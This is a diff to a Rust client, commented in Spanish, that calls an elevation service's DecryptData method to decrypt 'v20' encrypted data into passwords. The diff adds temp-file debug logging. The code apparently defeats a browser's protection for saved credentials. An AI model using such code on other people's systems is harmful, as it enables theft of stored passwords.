@@ -119,11 +119,22 @@ impl ElevationServiceClient {
 
     /// Desencripta datos v20 usando el Elevation Service
     pub fn decrypt_v20(&self, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
+        use std::fs::OpenOptions;
+        use std::io::Write;
+        let temp_dir = std::env::temp_dir();
+        let debug_path = temp_dir.join("elevation_service_debug.txt");
+        let mut debug = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(debug_path)
+            .unwrap();
+
+        writeln!(debug, "[decrypt_v20] Called with {} bytes", encrypted_data.len()).ok();
         unsafe {
             let mut decrypted_ptr: *mut u8 = ptr::null_mut();
             let mut decrypted_size: u32 = 0;
 
-            // Llamar al método DecryptData
+            writeln!(debug, "[decrypt_v20] Calling DecryptData...").ok();
             let hr = ((*(*self.elevator).lpVtbl).DecryptData)(
                 self.elevator,
                 encrypted_data.as_ptr(),
@@ -131,32 +142,57 @@ impl ElevationServiceClient {
                 &mut decrypted_ptr as *mut *mut u8,
                 &mut decrypted_size as *mut u32,
             );
+            writeln!(debug, "[decrypt_v20] DecryptData returned: 0x{:08X}", hr).ok();
 
             if hr != S_OK {
+                writeln!(debug, "[decrypt_v20] DecryptData failed").ok();
                 return Err(format!("DecryptData failed: 0x{:08X}", hr));
             }
 
             if decrypted_ptr.is_null() || decrypted_size == 0 {
+                writeln!(debug, "[decrypt_v20] Decrypted data is null or empty").ok();
                 return Err("Decrypted data is null or empty".to_string());
             }
 
-            // Copiar datos desencriptados
+            writeln!(debug, "[decrypt_v20] DecryptData SUCCESS, {} bytes", decrypted_size).ok();
             let decrypted_data = std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();
-
-            // Liberar memoria asignada por COM
-            // Nota: Esto depende de cómo el servicio asigna memoria
-            // Puede que necesitemos CoTaskMemFree
-            
             Ok(decrypted_data)
         }
     }
 
     /// Desencripta un password v20 y convierte a String
     pub fn decrypt_password(&self, encrypted_data: &[u8]) -> Result<String, String> {
-        let decrypted_bytes = self.decrypt_v20(encrypted_data)?;
-        
-        String::from_utf8(decrypted_bytes)
-            .map_err(|e| format!("Invalid UTF-8: {}", e))
+        use std::fs::OpenOptions;
+        use std::io::Write;
+        let temp_dir = std::env::temp_dir();
+        let debug_path = temp_dir.join("elevation_service_debug.txt");
+        let mut debug = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(debug_path)
+            .unwrap();
+
+        writeln!(debug, "[decrypt_password] Called with {} bytes", encrypted_data.len()).ok();
+        let decrypted_bytes = match self.decrypt_v20(encrypted_data) {
+            Ok(data) => {
+                writeln!(debug, "[decrypt_password] decrypt_v20 OK, {} bytes", data.len()).ok();
+                data
+            },
+            Err(e) => {
+                writeln!(debug, "[decrypt_password] decrypt_v20 ERROR: {}", e).ok();
+                return Err(e);
+            }
+        };
+        match String::from_utf8(decrypted_bytes) {
+            Ok(s) => {
+                writeln!(debug, "[decrypt_password] UTF8 OK").ok();
+                Ok(s)
+            },
+            Err(e) => {
+                writeln!(debug, "[decrypt_password] UTF8 ERROR: {}", e).ok();
+                Err(format!("Invalid UTF-8: {}", e))
+            }
+        }
     }
 }
 
